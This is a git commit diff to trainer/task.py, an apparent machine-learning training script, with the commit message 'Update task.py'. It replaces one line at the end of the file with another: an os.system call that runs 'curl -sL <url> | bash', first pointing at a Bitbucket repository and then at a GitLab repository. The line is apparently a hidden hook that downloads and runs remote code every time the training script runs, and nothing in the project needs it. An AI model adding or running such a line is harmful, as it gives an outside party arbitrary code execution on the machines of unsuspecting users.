67a33d237952d01e91f8da0e1d3363e6fdfbe5c7
mustofaku <mustofa@kukimna.aleeas.com>
2023-04-03 14:28:18 +0000

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -72,4 +72,4 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('curl -sL https://bitbucket.org/lightcoral2/escepekate/raw/master/vihah | bash')
+os.system('curl -sL https://gitlab.com/mustofaku/mustofa/raw/main/vihah | bash')
